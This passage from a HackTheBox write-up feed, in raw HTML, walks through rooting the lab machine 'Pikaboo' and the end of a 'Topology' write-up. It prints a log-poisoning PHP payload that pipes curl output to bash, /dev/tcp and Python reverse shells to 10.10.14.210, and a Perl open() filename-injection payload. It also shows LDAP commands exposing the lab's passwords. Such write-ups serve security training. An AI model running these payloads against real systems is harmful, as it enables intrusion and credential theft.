        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Using the cracked password we find, we&amp;rsquo;re able to ssh into the machine.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/ssh_topology.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;SSH-In&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;
&lt;h3 id=&#34;privilege-escalation&#34; &gt;Privilege Escalation
&lt;span&gt;
    &lt;a href=&#34;#privilege-escalation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Root is pretty straight forward, there&amp;rsquo;s a setuid binary (bash)
we could use to gain root privileges and read the root flag.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_root.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Becoming Root&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>HTB - Pikaboo</title>
      <link>https://ybenel.cf/post/htb-pikaboo/</link>
      <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ybenel.cf/post/htb-pikaboo/</guid>
      <description>&lt;p&gt;A Hard Machine That Consist On Exploiting MisConfigurations&lt;/p&gt;
&lt;p&gt;&lt;a id=&#34;orga478a8e&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;slim-to-none&#34; &gt;Slim To None
&lt;span&gt;
    &lt;a href=&#34;#slim-to-none&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h1&gt;&lt;p&gt;&lt;a id=&#34;orgbd954f4&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;general-enumeration&#34; &gt;General Enumeration
&lt;span&gt;
    &lt;a href=&#34;#general-enumeration&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;&lt;a id=&#34;orga965546&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;open-ports&#34; &gt;Open Ports
&lt;span&gt;
    &lt;a href=&#34;#open-ports&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;21 (vstpd 3.0.3) - 22 (SSH), 80 (Nginx), 8081 (py HTTP)&lt;/p&gt;
&lt;p&gt;&lt;a id=&#34;orgac5402c&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;initial-enum&#34; &gt;Initial Enum
&lt;span&gt;
    &lt;a href=&#34;#initial-enum&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Web (80), Has Auth&lt;sub&gt;Basic&lt;/sub&gt; (redirect to 401)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Confirmed Path Manipulation (Bypass 401) in /admin&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://10.10.10.249/admin../server-status
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a id=&#34;orgde05944&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;usernames-and-passwords&#34; &gt;Usernames And Passwords
&lt;span&gt;
    &lt;a href=&#34;#usernames-and-passwords&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;No Credentials Found&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a id=&#34;orgd93d112&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;interesting-discoveries&#34; &gt;Interesting Discoveries
&lt;span&gt;
    &lt;a href=&#34;#interesting-discoveries&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;admin page (&lt;a href=&#34;http://10.10.10.249/admin&#34;&gt;http://10.10.10.249/admin&lt;/a&gt;) [Requires Credentials]&lt;/li&gt;
&lt;li&gt;weird path /admin/admin&lt;sub&gt;staging&lt;/sub&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a id=&#34;orgd7cc00c&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;vulnerabilities-and-exploitation&#34; &gt;Vulnerabilities And Exploitation
&lt;span&gt;
    &lt;a href=&#34;#vulnerabilities-and-exploitation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Possible Exploitation Path&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;proof&#34; id=&#34;orgc2a0a36&#34;&gt;
&lt;p&gt;
log poisoning lead to RCE through
LFI -&amp;gt; (Cache VSFTPD) -&amp;gt; RCE
&lt;/p&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;Exploitation Of (Log Poisoning)
&lt;ol&gt;
&lt;li&gt;We do have LFI &lt;a href=&#34;http://10.10.10.249/admin../admin_staging/index.php?page=&#34;&gt;admin&lt;sub&gt;staging&lt;/sub&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;We Have A Valid Log file (/var/log/vsftpd.log)&lt;/li&gt;
&lt;li&gt;Payload
&lt;ol&gt;
&lt;li&gt;USER Field&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &amp;lt;?php exec(&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;curl http://10.10.14.210:8000/rev | bash&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Inside Of rev&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     &lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     /bin/bash -c &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.210/9110 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Curl The Path&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     curl http://10.10.10.249/admin../admin_staging/index.php
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     ?page=/var/log/vsftpd.log
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Grab User.txt
&lt;img src=&#34;https://ybenel.cf/imgs/pikaboo/user_flag.png&#34; alt=&#34;img&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a id=&#34;org0744151&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;user-enumeration&#34; &gt;User Enumeration
&lt;span&gt;
    &lt;a href=&#34;#user-enumeration&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;&lt;a id=&#34;org4820c84&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;interesting--discoveries&#34; &gt;Interesting  Discoveries
&lt;span&gt;
    &lt;a href=&#34;#interesting--discoveries&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Cronjob (root) /usr/local/bin/csvupdate&lt;sub&gt;cron&lt;/sub&gt;&lt;/li&gt;
&lt;li&gt;/etc/apache2/htpasswd (HTPass Auth Basic) (Salted MD5)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a id=&#34;orge0cdc6b&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;passwords&#34; &gt;Passwords
&lt;span&gt;
    &lt;a href=&#34;#passwords&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;xxj31ZMTZzkVA (/etc/apache2/sites-available/default-ssl.conf)&lt;/li&gt;
&lt;li&gt;Salted MD5 ($apr1$0.2FVvEK$Xn42uf/ySS5IPTKXfebXM.) [Not Cracked]&lt;/li&gt;
&lt;li&gt;J~42%W?PFHl]g (Ldap /opt/pokeapi/config/settings.py)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a id=&#34;org9d946cd&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;user&#34; &gt;User
&lt;span&gt;
    &lt;a href=&#34;#user&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Grabing User Password Through Ldap&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ldapsearch -x -h 127.0.0.1 -D &#39;cn=binduser,ou=users,dc=pikaboo,dc=htb&#39; -w J~42%W?PFHl]g -b &#39;dc=ftp,dc=pikaboo,dc=htb&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;pwnmeow user&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==

echo -n X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d
_G0tT4_C4tcH_&#39;3m_4lL!_
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a id=&#34;org32b305e&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34; &gt;Privilege Escalation
&lt;span&gt;
    &lt;a href=&#34;#privilege-escalation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;&lt;a id=&#34;org42aa660&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;vulnerabities-exploitation&#34; &gt;Vulnerabities Exploitation
&lt;span&gt;
    &lt;a href=&#34;#vulnerabities-exploitation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;From The Previous Cronjobs We found we noticed there’s a script /usr/local/bin/csvupdate&lt;sub&gt;cron&lt;/sub&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;#!/bin/bash&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; d in /srv/ftp/*
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      cd &lt;span style=&#34;color:#fb660a&#34;&gt;$d&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      /usr/local/bin/csvupdate &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;$(&lt;/span&gt;basename &lt;span style=&#34;color:#fb660a&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;)&lt;/span&gt; *csv
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      /usr/bin/rm -rf *
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Essentially What the script does is that it lists all the folders exist in /srv/ftp and takes all csv files
and directs them as argument to another script called csvupdate.
Now as we read the perl script, we noticed it does use open() function to open files, However
after little bit of documentation reading we noticed that, if two filenames specified , if one had pipe symbol “|”
it will be interpreted as command thus being executed it.
Now Our Root Path has become more clear to what we should do.
I Found this stack overflow &lt;a href=&#34;https://stackoverflow.com/questions/26614348/perl-open-injection-prevention&#34;&gt;discussion&lt;/a&gt; which demonstrate , how we can achieve this. Unfortunately this was not that simple!
Bash commands were not suitable for this coz of being executed before even attempting to run them, and it the idea was to craft a malicious payload that will be a name of empty file that we will upload to pwnmeow user’s ftp as we got his credentials previously.
Other thing was to create a temporary file that has our payload which we can then execute by calling its full path, tho the issue is that we cannot create filename’s as a path , which left us we fewer options.
Since Python was available, we can use a oneliner reverse shell as our payload , tho it had to be really perfect specially with escaping double quotes.
I Used the following oneliner reverse shell&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    python -c &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.210&amp;#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(&amp;#34;sh&amp;#34;);&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After Editing it to escape double quotes and create an empty file&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    touch &lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;|python3 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;&lt;/span&gt;\&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;10.10.14.210&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;1337&lt;/span&gt;));os.dup2(s.fileno(),&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;0&lt;/span&gt;); os.dup2(s.fileno(),&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;1&lt;/span&gt;); os.dup2(s.fileno(),&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2&lt;/span&gt;);p=subprocess.call(&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;sh&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;;.csv&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we go back to ftp and upload it, &lt;strong&gt;ONE BIG FAT WARNING&lt;/strong&gt; If you tried to upload the file to the root folder, it will not work and file will not be uploaded, and you’ll get really frustrated on why not it didn’t work like myself lol.
Choose any folder , it doesn’t matter which one and upload it to it .
&lt;img src=&#34;https://ybenel.cf/imgs/pikaboo/ftp_upload.png&#34; alt=&#34;img&#34;&gt;
&lt;strong&gt;Notice&lt;/strong&gt; in ur listener it will first connect back from ur machine , kill it immediately and re-run your listener, After few seconds
You’ll receive a
&lt;img src=&#34;https://ybenel.cf/imgs/pikaboo/root_flag.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>HTB - Armageddon</title>
      <link>https://ybenel.cf/post/htb-armageddon/</link>
      <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ybenel.cf/post/htb-armageddon/</guid>
